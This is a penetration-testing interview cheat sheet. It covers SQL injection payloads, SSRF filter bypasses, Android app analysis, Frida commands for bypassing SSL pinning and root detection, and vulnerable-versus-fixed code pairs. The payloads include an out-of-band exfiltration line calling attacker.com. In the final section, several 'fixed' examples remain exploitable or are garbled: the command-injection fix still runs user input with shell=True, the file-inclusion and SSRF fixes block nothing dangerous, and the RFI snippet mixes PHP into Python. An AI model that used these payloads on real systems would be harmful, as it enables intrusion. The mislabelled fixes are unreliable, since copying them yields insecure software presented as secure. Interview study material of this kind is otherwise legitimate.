


# Web Application
---

**Most Common Questions:**

- SQL injection and it's type
- SSRF and bypass
-  xml attack
- login page - scenario (authentication bypass by SQL injection, host header injection, url
    redirection, username enumeration, rate limiting or brute force,
- Billion laugh attack
- Deserialization Vulnerability,
- SSL key Pinning bypass
- directory traversal,
- LFI and RFI
- How to connect proxy with mobile
- SSRF exploit LFI, RFI, or command injection, port scan etc.
>

### SQL Injection and Its Types


| **Type**                       | **Sub-Type**                  | **Description**                                                                                      | **Example Commands**                                  |
|-------------------------------|-------------------------------|------------------------------------------------------------------------------------------------------|-----------------------------------------------------|
| **In-band SQL Injection**      |                               | Uses the same communication channel for both launching the attack and retrieving results              |                                                     |
|                                | a) **Union-based SQLi**       | Utilizes the SQL UNION operator to combine the results of multiple SELECT queries into a single result set | `1 UNION SELECT username, password FROM users, ' UNION SELECT null, null--, ' UNION SELECT null, null, null--, ' UNION SELECT null, null, null, null--` |
|                                | b) **Error-based SQLi**       | Injects SQL code that triggers database errors, potentially revealing information about the database schema or contents | `AND 1=1--, SELECT 1/0--, AND 1=0--, AND 1=1#, OR 1=1, OR x=x` |
| **Blind SQL Injection**        |                               | The attacker does not see the result of the query directly but infers information from the application's responses |                                                     |
|                                | a) **Boolean-based Blind SQLi** | Sends SQL queries that result in true or false responses to infer data based on the application's behavior | `' OR '1'='1, ' OR 1=1--, " OR "" = ", " OR 1 = 1--, ' OR '' = ', ' OR 1=1 AND 'a'='a` |
|                                | b) **Time-based Blind SQLi**  | Introduces delays in SQL queries to infer data based on the application's response time              | `SLEEP(5)--, " OR SLEEP(5)--, ' OR SLEEP(5)--, WAITFOR DELAY '00:00:10'--` |
| **Out-of-band SQL Injection**  |                               | Uses alternative communication channels (such as DNS or HTTP) to exfiltrate data                      | `http://example.com/somepage.php?id=1; nslookup attacker.com` |
| **Second-order SQL Injection** |                               | The malicious payload is stored within the application's database and executed later when certain conditions are met | `INSERT INTO users (username, password) VALUES ('test', 'test'); -- The stored payload executes later when the application processes the data` |




#### OWASP TOP 10: Web and Mobile:
| **2021 Web Top 10**                            | **Mobile Top 10 2024**             |
|-----------------------------------------------|------------------------------------------|
| A01:2021-Broken Access Control                | M1: Improper Credential Usage            |
| A02:2021-Cryptographic Failures               | M2: Inadequate Supply Chain Security     |
| A03:2021-Injection                            | M3: Insecure Authentication/Authorization|
| A04:2021-Insecure Design                      | M4: Insufficient Input/Output Validation|
| A05:2021-Security Misconfiguration           | M5: Insecure Communication               |
| A06:2021-Vulnerable and Outdated Components  | M6: Inadequate Privacy Controls          |
| A07:2021-Identification and Authentication Failures| M7: Insufficient Binary Protections |
| A08:2021-Software and Data Integrity Failures | M8: Security Misconfiguration           |
| A09:2021-Security Logging and Monitoring Failures| M9: Insecure Data Storage            |
| A10:2021-Server-Side Request Forgery (SSRF)*  | M10: Insufficient Cryptography          |

<br>

#### OWASP top : API and Thick Client

| **OWASP Top 10 API Security Risks**                     | **2023 OWASP Desktop App Security Top 10**          |
|--------------------------------------------------------|-----------------------------------------------------|
| API1:2023 Broken Object Level Authorization            | DA1 - Injections                                    |
| API2:2023 Broken Authentication                        | DA2 - Broken Authentication & Session Management    |
| API3:2023 Broken Object Property Level Authorization   | DA3 - Sensitive Data Exposure                      |
| API4:2023 Unrestricted Resource Consumption           | DA4 - Improper Cryptography Usage                  |
| API5:2023 Broken Function Level Authorization         | DA5 - Improper Authorization                       |
| API6:2023 Unrestricted Access to Sensitive Business Flows | DA6 - Security Misconfiguration                |
| API7:2023 Server Side Request Forgery                  | DA7 - Insecure Communication                       |
| API8:2023 Security Misconfiguration                    | DA8 - Poor Code Quality                            |
| API9:2023 Improper Inventory Management                | DA9 - Using Components with Known Vulnerabilities  |
| API10:2023 Unsafe Consumption of APIs                 | DA10 - Insufficient Logging & Monitoring           |

<br><br>
### Most Common Ports and services

| **Common Ports and Services**                | **Common Ports and Services**                      |
|---------------------------------------------|----------------------------------------------------|
| 20 - FTP (File Transfer Protocol)          | 514 - Syslog                                       |
| 21 - FTP (File Transfer Protocol)          | 53 - DNS (Domain Name System)                      |
| 22 - SSH (Secure Shell)                    | 587 - SMTP (Submission)                            |
| 23 - Telnet                                | 67 - DHCP (Dynamic Host Configuration Protocol) - Server |
| 25 - SMTP (Simple Mail Transfer Protocol)  | 5900 - VNC (Virtual Network Computing)             |
| 68 - DHCP (Dynamic Host Configuration Protocol) - Client | 3389 - RDP (Remote Desktop Protocol)       |
| 80 - HTTP (Hypertext Transfer Protocol)    | 110 - POP3 (Post Office Protocol version 3)        |
| 115 - SFTP (Simple File Transfer Protocol) | 119 - NNTP (Network News Transfer Protocol)        |
| 123 - NTP (Network Time Protocol)          | 143 - IMAP (Internet Message Access Protocol)      |
| 161 - SNMP (Simple Network Management Protocol) | 27017 - MongoDB                                   |
| 3306 - MySQL Database                      | 5432 - PostgreSQL Database                         | 

<br><br>
#### Common Missing Security Headers:
| Security Header               | Description                                                                                                                                                                      | Vul vs Fix                                                                                                                   |
|-------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------|
| **Content-Security-Policy**  | In simple terms, the purpose of the "Content Security Policy" (CSP) header is to help protect websites from malicious attacks, particularly Cross-Site Scripting (XSS).          | `Content-Security-Policy: script-src 'self' 'unsafe-inline' 'unsafe-eval';`<br>`Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.google.com ;`<br><br> **Example 2:**<br>`Content-Security-Policy: default-src 'self' https://example.com;`<br>`Content-Security-Policy: default-src 'self'; script-src 'self' https://example.com;` |
| **X-Frame-Options**          | X-Frame-Options : Tell the browser whether you want to allow your site to be framed or not. By preventing a browser from framing your site you can defend against attacks like clickjacking. | `X-Frame-Options: SAMEORIGIN`<br>`X-Frame-Options: Self`                                                                                                                                 |
| **X-Content-Type-Options**   | X-Content-Type-Options stops a browser from trying to MIME-sniff the content type and force it to stick with the declared content-type.                                             | `X-Content-Type-Options: no sniff"`                                                                                                                                                      |
| **Referrer-Policy**          | In simpler terms, the purpose of the "Referrer Policy" header is to control how much information the browser shares when you click on a link and leave a webpage.                | **Vulnerable Example:**<br>`Referrer-Policy: unsafe-url`<br>This setting allows the full URL (including path and query parameters) to be sent in the Referer header, potentially exposing sensitive information.<br><br>**Fix Example:**<br>`Referrer-Policy: strict-origin`<br>This setting instructs the browser to include only the origin (scheme, host, and port) of the referring URL in the Referer header, enhancing user privacy and security. |
| **Permissions-Policy**       | - **Purpose:** Controls which browser features and APIs can be used.<br>- **Vulnerable Example:** Permissions-Policy:accelerometer=*<br>This setting allows any origin to access the device's accelerometer API, potentially leading to unauthorized access or misuse of sensitive device capabilities.<br>- **Fix Example:** Permissions-Policy: accelerometer=()<br>This setting restricts access to the accelerometer API to the same origin only, preventing unauthorized access and reducing the risk of exploitation. | `Permissions-Policy: camera=*, geolocation=*, microphone=*`<br>This policy allows any origin to access the camera, geolocation, and microphone APIs, potentially leading to unauthorized access or misuse of sensitive device capabilities:<br>`Permissions-Policy: camera=(), geolocation=(), microphone=()`<br>This policy restricts access to the camera, geolocation, and microphone APIs to the same origin only, preventing unauthorized access and reducing the risk of exploitation. | 

<br><br>
### Common Cookies and It’s values


| Cookies         | Values             | Description                                                                                                                                                                   | Vulnerable Example                                  | Fix Example                                                                                                       |
|-----------------|--------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------|--------------------------------------------------------------------------------------------------------------------|
| Secure          | Secure             | By setting the secure attribute, the cookie will only be sent over HTTPS connections, reducing the risk of interception by attackers.                                       | `Set-Cookie: session_id=abc123;`                   | `Set-Cookie: session_id=abc123; Secure`                                                                           |
| HttpOnly        | HttpOnly           | When a cookie has the HttpOnly attribute set, JavaScript cannot access it, which helps mitigate certain types of XSS attacks.                                                | `Set-Cookie: session_id=abc123;`                   | `Set-Cookie: session_id=abc123; HttpOnly`                                                                         |
| SameSite        | Strict, Lax, None | The SameSite attribute defines when cookies should be sent along with cross-site requests.                                                                                    | `Set-Cookie: session_id=abc123; SameSite=None`     | `Set-Cookie: session_id=abc123; SameSite=Strict; Secure`                                                           |




<br><br>
### Intruder attack Type:


| Attack Type    | Description                                                                                                                                                                   |
|----------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| **Sniper:**    | - Work on single payload set.<br>- If 3 positions are selected then one by one position are set with payload to run. It work set payload in first position and rest two values will as it is. Now same goes of rest two positions.<br>- It means sniper handles single position at a time. |
| **Battering RAM** | - Work on single payload set.<br>- Payload set at all positions simultaneously.                                                                                                  |
| **Pitchfork**  | - Work on multiple sets of payload.<br>- Work on the minimum number of payloads.<br>- If two payloads contain numbers like 6 and 4, then will generate 4 payloads only.<br>- To run this at all positions one payload is needed. |
| **Cluster Bomb** | - Work on multiple sets of payload.<br>- All the permutation and combination of payloads are generated.<br>- Suppose if the payload set is 2 and position also two then works as shown in image. |



**LFI vs RFI**
LFI stand for local file inclusion, which means an attacker can access files on server through a
vulnerable parameter or input. RFI stands for remote file inclusion, which means an attacker can
include a file from a remote server and execute it on your server

##### SSRF

Server-side request forgery is a web security vulnerability that allows an attacker to force the server-
side application to make requests to an unintended location
Common Bypass technique:

**Whitelisted Domains Bypass**

- Protocols:
    o file:// - file:///etc/passwd
    o SFTP:// url=sftp://generic.com:
- Bypass by HTTPS [ https://127.0.0.1/ - > https://localhost/ ]
- URL encoding - [http://127.0.0.1/%61dmin](http://127.0.0.1/%61dmin)
- Double URL Encoding -
- Decimal IP - 192.168.1.1 - 3232235777
- Ocotal IP - 192.168.1.1 - 0300.0250.01.
Mitigation:
- **Input Whitelisting** : Implement strict input validation and enforce a whitelist of allowed
domains or resources that your application can access. Only trusted and necessary domains
should be permitted.
- **URL Normalization** : Normalize URLs before processing to remove any obfuscation
techniques or redundant encoding. Tools like the url-normalize library can help in this
regard.
--


---
---
# Android Application
---

Android architecture contains different number of components to support any android device
needs. Android software contains an open-source Linux Kernel having collection of number of C/C++
libraries which are exposed through an application framework services.

Among all the components Linux Kernel provides main functionality of operating system functions to
smartphones and Dalvik Virtual Machine (DVM) provide platform for running an android application.

The main components of android architecture are following:-

- Applications
- Application Framework
- Android Runtime
- Platform Libraries
- Linux Kernel

| **Component**              | **Description**                                                                                                   |
|----------------------------|-------------------------------------------------------------------------------------------------------------------|
| **Applications**           | Top layer where pre-installed and third-party applications reside. Runs within Android runtime using framework services. |
| **Application Framework** | Provides essential classes for creating applications, including services like activity manager and notification manager. |
| **Android Runtime**        | Contains core libraries and Dalvik Virtual Machine (DVM) that support application execution.                        |
| **Dalvik Virtual Machine** | Optimized for Android, DVM manages multiple instances efficiently and relies on Linux kernel for low-level tasks.    |
| **Platform Libraries**     | Includes C/C++ and Java libraries for media, graphics, and databases, among others.                                 |
| **Linux Kernel**           | Core of Android architecture managing drivers, memory, power, and providing security, memory, and process management. |


### Common Components :

| **Component**                | **Description**                                                                                       | **Potential Security Issues**                                       |
|------------------------------|-------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------|
| **Activity**                 | Represents a single screen with a user interface in an Android application. Entry point for user interaction. | Insecure data storage, input validation, authentication flaws.      |
| **Broadcast Receiver**       | Listens for system-wide broadcast messages or intents. Responds to system events.                      | Insecure broadcast handling, privilege escalation.                 |
| **Intent**                   | Messaging object used to communicate between components. Starts Activities, Services, delivers broadcasts, or passes data. | Intent spoofing, intent injection, insecure data passing.           |
| **Explicit Intents**         | Used to start a specific component within the same application. Requires specifying the target component's class or package name. | Example: Starting a new Activity within the app.                   |
| **Implicit Intents**         | Used to trigger actions based on an action string. Does not specify the target component's name but defines an action to be performed. Android system resolves the intent based on available components capable of handling the action. | Example: Opening a web page or sending an email.                   |
| **Service**                  | Background component that performs long-running operations. Runs tasks asynchronously without a user interface. | Insufficient authentication, denial of service (DoS), data leakage. |
| **Content Provider**         | Manages shared application data accessible by other applications or components. Provides a standardized interface for accessing and manipulating data. | Insecure data exposure, insufficient access controls.              |
| **Manifest File (AndroidManifest.xml)** | Configuration file containing essential information about the application. Declares components, permissions, and hardware requirements. | Excessive permissions, missing security controls.                   |
| **WebView**                  | Embeds web content within an application. Can execute JavaScript, load remote URLs, and interact with the DOM. | JavaScript injection, XSS attacks, insecure communication.         |
| **Activity Manager**         | Manages the lifecycle of application activities. Controls the creation, starting, pausing, and stopping of activities. Handles activity stacking and navigation within the application. | Potential for activity leakage, improper activity lifecycle handling leading to data leaks or crashes. |



### Common Tool for Static Analysis–

- **Tool** :
    - **Automation** : MobSF, BuprSuite, Frida, Drozer ...
    - **Manual** : Burpsuite, apktool , jadx-gui, dex2jar, Ghidra

**dex2jar** is a command-line tool for converting Android DEX files (Dalvik Executable) to JAR files,
which can then be decompiled using Java decompiles like JD-GUI

**Ghidra** is powerful reverse engineering framework. It provides features for disassembly,
decompilation, scripting, and collaborative reverse engineering, making it suitable for static analysis

### APK Folder Components –

The Android Package (APK) file is a compressed archive file that contains all the files needed to run
an Android application on an Android device. The APK file is essentially a ZIP file that contains
several components, including:

##### 1. AndroidManifest.xml: 
- This file contains information about the application, including its package name, version number, required permissions, and components such as activities,
services, and broadcast receivers.

##### 2. Classes.dex: 
- This file contains the compiled Java bytecode for the application’s classes, which are executed by the Android Runtime (ART).

###### 3. Resources.arsc:
 - This file contains compiled resources such as strings, images, and layouts that are used by the application.

##### 4. lib/:
-  This folder contains compiled native code libraries for specific device architectures,
such as ARM or x86.

##### 5. META-INF/:
-  This folder contains the manifest file, the certificate of the APK signature, and a
list of all the files in the APK, along with their checksums.
##### 6. assets/: This folder contains additional application data files, such as sound and video files,

#### that are not compiled into the APK.

#### 7. res/: This folder contains the application resources, such as layouts, strings, and images, in

```
their original format before being compiled into the Resources.arsc file.
```
#### 8. Android System Files: This folder contains system-level files such as the Android runtime,

```
framework libraries, and system components that the application may use.
```

## APK Static Analysis

- **Permissions:** Check if the application requests any sensitive permission like camera,
    microphone, location, SMS, or call logs. If the app is requesting unnecessary permissions, it
    could be a red flag for privacy violations or potential security risks.
- **Components:** Android components like activities, services, receivers, and providers can be
    exploited by attackers to gain unauthorized access or to launch attacks. Check if any of the
    components are exposed to other applications or if they are exported with overly permissive
    access.
- **android:exported —** The default value of the attribute is true. (should be set to false)
- **Intents:** Intents are messages used by different Android components to communicate with
    each other. They can be used to launch activities, services, or broadcast messages. Check if
    the app is using any implicit intents that could be intercepted or manipulated by attackers.
- **Allow debugable: true —** Without a rooted phone it is possible to extract the data or run an
    arbitrary code using application permission (Should be false) The default value is “false”
- **Allow backup: true — The** default value of this attribute is true. This setting defines whether
    application data can be backed up and restored by a user who has enabled usb
    debugging.(Should be false)
- **Application information:** Check if the application has any hard-coded credentials, sensitive
    information, or debugging features that could be exploited by attackers.
- **Malware signatures —** Check if the application has any malware signatures that could
    indicate that the app is malicious or potentially harmful.
- **Target SDK version —** Check if the app is targeting an older version of the Android SDK. If
    the app is not targeting the latest version, it could be vulnerable to known security

#### vulnerabilities.

### Common Static Vulnerability –

- Weak Cryptography
- Look for use of encryption algorithms and verify implementation correctness.
- Check for hardcoded keys, weak encryption methods, or use of insecure cryptographic
algorithms.
- Code Obfuscation:
    -  Check for obfuscation techniques used to hide code.
    -  Verify that obfuscation does not hide malicious code.
- API Usage:
    - Verify absence of insecure or vulnerable APIs.
    - Look for APIs allowing unauthorized access or data leakage.
- Hardcoded Sensitive Information:
- Look for insecure storage of sensitive data.
- Check for hardcoded database queries, passwords, keys, or URLs.
- External Libraries:
    - Verify absence of insecure or vulnerable third-party libraries.
- **Integrity Checks:**
    - Look for integrity checks to prevent tampering with code.
- **Native Code:**
    -  If present, verify secure compilation of native code.
- **Web View Related Checks:**

    -  setJavaScriptEnabled(): Ensure proper validation of input data to prevent

    - injection of malicious JavaScript code.

    - setAllowFileAccess(): Validate input data to prevent unauthorized

    - access/modification of local files.

    - addJavascriptInterface(): Validate input data to prevent execution of

    - arbitrary Java code.

    - runtime.exec(): Prevent injection of malicious input data to avoid execution of

#### Arbitrary shell commands.

- Root Detection Implementation Details:
     - Verify implementation details of root detection mechanisms.
- SSL Pinning Implementation Details:
     - Review implementation details of SSL pinning to ensure secure communication.


## APK Dynamic Analysis

### Frida vs Drozer vs SSL Pinning –

**Frida:**

- Dynamic instrumentation toolkit for mobile app security testing.
- Supports Android and iOS devices.
- Allows injection of JavaScript into running applications.
- Features function hooking, method interception, data manipulation, and security mechanism bypass.
- Useful for real-time manipulation of app behavior and analyzing security vulnerabilities

**Drozer:**

- Comprehensive security assessment tool for Android applications.
- Enables dynamic analysis, code review, and exploitation.
- Provides features such as data theft, permission analysis, and component manipulation.
- Designed for penetration testers to assess Android app security thoroughly.

**SSL Pinning:**

- Security mechanism used in mobile applications.
- Prevents unauthorized interception of communication.
- Ensures communication only with trusted servers.
- Mitigates risks of Man-in-the-Middle attacks.
- Implemented by embedding and verifying server certificates or public keys.
- Essential for safeguarding sensitive data in transit

### Lab Setup and perquisite for Dynamic Pretesting –

- **Download any emulator** : Genymotion, NoxPlayer
- **Proxy Configuration**
    - Export burpsuite certificate
    - Configured port and interface in burpsuite.
    - Setup manual proxy in android device and enter the ip and port of burp config.
    - Send Burpsuite certificate in android and install.
    - Burp configuration done.
- **Setup Frida with BuprSuite:**
    - Check android architecture and download accordingly **Frida-server**
       adb shell getprop ro.product.cpu.abi // Check architecture
    - Download the burp certificate and renamed it as cert-der.crt

- Now send the Frida-server and burp certificate in android location /data/local/tmp
- Done!
- 
- **Check packages**

```
adb shell pm list packages
// List all installed packages
```
```
adb shell pm list packages - f
// List all installed packages with file paths
```
```
adb shell pm list packages | Select-String "camera"
// Filter packages containing "camera" for windows
```
```
adb shell pm list packages | grep camera
// Filter packages containing "camera"
```
**SSL Pinning Bypass command**

- **SSL Unpinning using Frida**

```
# Setup frida sever in android
adb shell
cd /local/data/tmp
./frida-server
```
```
# Identify Package name
/data/local/tmp # ps -e | grep frida-server
adb shell "pm list packages -f"
frida-ps - Uai //get identifire
frida-ps - Ua // list running applications pkg
```
```
# Run Command Frida for bypass
frida - U - f com.package.test - l ssl-fridascript.js
```
**Frida command explain**

- f: Specifies the target application package name ('com.userapp.test') to attach to.
- l: Specifies the Frida script file (`fridascript.js`) to load and execute.
- U: Specifies that the target device is connected over USB.
- **SSL Unpinning using Exposed-Module**

##### SSL Unpinning Bypass using Expose Module
    
    git clone https://github.com/ac-pm/SSLUnpinning_Xposed.git
    cd /SSLUnpinning_Xposed

    adb install mobi.acpm.sslunpinning_latest.apk
    
    Open in android and check for SSL unpinning

- **Root Detection Bypass Using Frida**

```
# Bypass anti-root detection mechanisms
frida - U --codeshare dzonerzy/fridantiroot - f in.<package
company>.<package name
```
---
---
# Source Code Analysis
---
### > Vulnerable code Challenge:

## SQL Injection (SQLi)
- Vulnerable Code: Direct concatenation of user input into SQL query.
- Fix: Use parameterized queries to separate data from commands.

```python
import sqlite3

def get_user(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = '" + username + "'")  # Vulnerable
    return cursor.fetchone() 
```

 - **Fixed Code**
```python
def get_user(username):
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))  # Fixed
    return cursor.fetchone() 
```

## Server-Side Request Forgery (SSRF)
- Vulnerable Code: Direct use of user-controlled input in HTTP requests.
- Fix: Validate and restrict user-supplied URLs to prevent SSRF.
```python
import requests

def fetch_url(url):
    response = requests.get(url)  # Vulnerable
    return response.text
```

 -  **Fixed Code**
```python
def fetch_url(url):
    if not url.startswith('http://') and not url.startswith('https://'):
        raise ValueError('Invalid URL')
    response = requests.get(url)
    return response.text
```

## Cross-Site Scripting (XSS)
- Vulnerable Code: Rendering user input without proper escaping.
- Fix: Use escaping functions to prevent injection of malicious scripts.

```python
from flask import Flask, request, render_template_string, escape

app = Flask(__name__)

@app.route('/')
def index():
    name = request.args.get('name', 'Guest')
    return render_template_string('<h1>Hello, {{ name }}</h1>', name=name)  # Vulnerable
```

- **Fixed Code**

```python
 @app.route('/')
 def index():
    name = request.args.get('name', 'Guest')
    return render_template_string('<h1>Hello, {{ name | safe }}</h1>', name=escape(name))  # Fixed
```


## Cross-Site Request Forgery (CSRF)
- Vulnerable Code: Lack of CSRF token protection in forms.
- Fix: Include CSRF tokens in forms and AJAX requests.

```python
<form action="/transfer" method="post">
    <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
    <input type="hidden" name="amount" value="1000">
    <input type="submit" value="Transfer Money">
</form>
```

## OS Command Injection
- Vulnerable Code: Direct use of user input in system commands without validation.
- Fix: Use subprocess module with proper input validation and sanitization.
```python
import subprocess

def execute_command(command):
    result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)  # Vulnerable
    return result.decode("utf-8")
```

 - **Fixed Code**
```py
def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode("utf-8")
    except subprocess.CalledProcessError as e:
        return f"Error: {e}"
```

## Local File Inclusion (LFI)
- Vulnerable Code: Directly opens a file without proper validation.
- Fix: Check if the file exists before reading its content.
```python
def read_file(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
    return content
```
 - **Fixed Code**
```py
def read_file_fixed(file_path):
    if not os.path.isfile(file_path):
        return "File not found"
    with open(file_path, 'r') as file:
        content = file.read()
    return content
```

## Remote File Inclusion (RFI)
- Vulnerable Code: Makes an HTTP request to a user-supplied URL without proper validation.
- Fix: Check if the URL starts with 'http://' or 'https://' and handle HTTP errors properly.
```python
def fetch_remote_file(url):
    if not filter_var($url, FILTER_VALIDATE_URL):
        throw new Exception('Invalid URL')
    return file_get_contents($url)
```
  - **Fixed Code**
```py
def fetch_remote_file(url):
    if not url.startswith(('http://', 'https://')):
        return "Invalid URL"
    response = requests.get(url)
    if response.status_code != 200:
        return "Failed to fetch remote file"
    return response.text

```
